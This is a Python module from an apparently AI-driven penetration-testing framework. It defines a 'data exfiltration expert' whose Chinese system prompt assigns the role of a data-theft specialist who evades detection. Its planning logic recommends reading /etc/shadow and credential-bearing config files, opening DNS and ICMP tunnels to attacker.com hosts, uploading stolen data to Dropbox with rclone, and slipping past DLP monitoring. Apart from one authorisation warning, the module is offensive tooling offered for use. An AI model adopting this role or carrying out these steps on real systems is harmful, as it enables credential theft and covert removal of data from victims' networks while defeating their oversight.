"""
Data Exfiltration Expert

Expert in data exfiltration techniques and covert data transfer
through various channels while evading detection.
"""

import logging
from typing import List, Dict, Optional

from models.experts.base import PenTestExpert, ExpertAdvice, ExpertType

logger = logging.getLogger(__name__)


class DataExfiltrationExpert(PenTestExpert):
    """Expert in data exfiltration techniques."""

    TOOLS = [
        "dns_exfil", "icmphide", "ngrok", "croc", "rclone", "syncthing",
        "dropbox_upload", "mega_sync", "wget", "curl", "certutil",
        "bitsadmin", "powercat", "pwndrop", "quickdrop"
    ]

    SYSTEM_PROMPT = """你是一位资深的数据窃取专家。

专长领域：
- 隐蔽数据传输通道建立
- DNS隧道数据传输
- ICMP隐藏数据传输
- HTTP/HTTPS隐蔽传输
- 云存储外传
- 数据压缩和编码
- 分片传输和重组
- 防检测绕过

传输技术：
- DNS查询/响应携带数据
- ICMP Echo负载隐藏数据
- Steganography图像隐写
- Base64/Hex编码传输
- 分块并发传输

工具集：
- icmphide: ICMP隐藏通道
- dnscat2: DNS隧道
- certutil: Windows内置编码
- rclone: 云存储上传
- pwndrop: 隐蔽文件服务

窃取原则：
1. 优先使用加密通道
2. 分小批量传输避免检测
3. 模拟正常流量模式
4. 记录所有传输用于后续分析
5. 测试完整性校验
"""

    def __init__(self, llm_provider=None, rag_retriever=None):
        super().__init__(
            expert_type=ExpertType.DATA_EXFILTRATION,
            llm_provider=llm_provider,
            rag_retriever=rag_retriever,
            tools=self.TOOLS,
        )

    def analyze(self, state: dict, context: dict = None) -> ExpertAdvice:
        """Analyze data exfiltration opportunities."""
        self.call_count += 1

        has_shell = state.get("has_shell", False)
        is_admin = state.get("is_admin", False)
        target = state.get("target", "")
        credentials = state.get("credentials", [])
        data_sources = state.get("data_sources", [])
        firewalls = state.get("firewalls", [])

        actions = []
        tools = []
        warnings = []
        reasoning = ""
        confidence = 0.5

        if not has_shell:
            actions.append({
                "type": "wait",
                "description": "需要先获得目标系统访问权限",
            })
            reasoning = "尚未获得访问权限，无法进行数据传输。"
            confidence = 0.6
        elif not data_sources and not credentials:
            actions.append({
                "type": "recon",
                "description": "枚举敏感数据源位置",
                "locations": ["/etc/shadow", "/var/www", "/home", "/opt", "C:\\Users\\", "C:\\inetpub\\"],
            })
            actions.append({
                "type": "recon",
                "description": "寻找配置文件中的凭据",
                "file_patterns": ["*.config", "*.ini", "*.xml", "*.json", "web.config", "app.config"],
            })
            reasoning = "需要先发现敏感数据源。"
            confidence = 0.5
        else:
            # Assess firewall and egress filtering
            if firewalls:
                actions.append({
                    "type": "recon",
                    "description": "测试防火墙出口策略",
                    "checks": ["允许的出站端口", "DNS查询", "ICMP"],
                })

                # DNS exfiltration
                actions.append({
                    "type": "setup",
                    "tool": "dnscat2",
                    "params": {"domain": "exfil.attacker.com"},
                    "description": "建立DNS隧道作为传输通道",
                    "priority": 1,
                })
                tools.append("dnscat2")

                # ICMP tunnel
                actions.append({
                    "type": "setup",
                    "tool": "icmphide",
                    "params": {"server": "attacker.com"},
                    "description": "建立ICMP隐藏通道",
                    "priority": 2,
                })
                tools.append("icmphide")
            else:
                # HTTPS exfil
                actions.append({
                    "type": "exfil",
                    "description": "通过HTTPS隐蔽传输数据",
                    "approach": "POST请求分块上传",
                })

            # Data preparation
            actions.append({
                "type": "prepare",
                "description": "准备数据：压缩、加密、分片",
                "steps": ["识别敏感文件", "压缩打包", "加密处理", "分块准备传输"],
            })

            # Cloud storage option
            if credentials:
                actions.append({
                    "type": "exfil",
                    "tool": "rclone",
                    "params": {"dest": "dropbox:exfil/"},
                    "description": "通过云存储外传数据",
                    "optional": True,
                })
                tools.append("rclone")

            reasoning = "已获得访问权限，准备数据传输通道。"
            confidence = 0.75

        # Windows-specific
        os_info = state.get("os", "")
        if "windows" in os_info.lower():
            actions.append({
                "type": "exfil",
                "tool": "certutil",
                "params": {"mode": "encode"},
                "description": "使用certutil编码数据",
            })
            tools.append("certutil")

        warnings.append("数据传输操作敏感，确保有授权")
        warnings.append("大文件传输可能触发DLP系统")
        warnings.append("加密传输避免网络监控")

        return ExpertAdvice(
            expert_type=self.expert_type,
            summary=f"数据窃取测试，推荐 {len(actions)} 个传输行动",
            recommended_actions=actions,
            tools_to_use=list(set(tools)),
            confidence=confidence,
            reasoning=reasoning,
            warnings=warnings,
        )

    def get_prompt_template(self) -> str:
        return self.SYSTEM_PROMPT

    def _get_techniques(self) -> List[str]:
        return ["T1048", "T1048.001", "T1048.002", "T1048.003", "T1560", "T1005"]

    def _get_required_inputs(self) -> List[str]:
        return ["has_shell", "data_sources"]

    def _get_outputs(self) -> List[str]:
        return ["exfil_data", "transfer_complete", "channel_status"]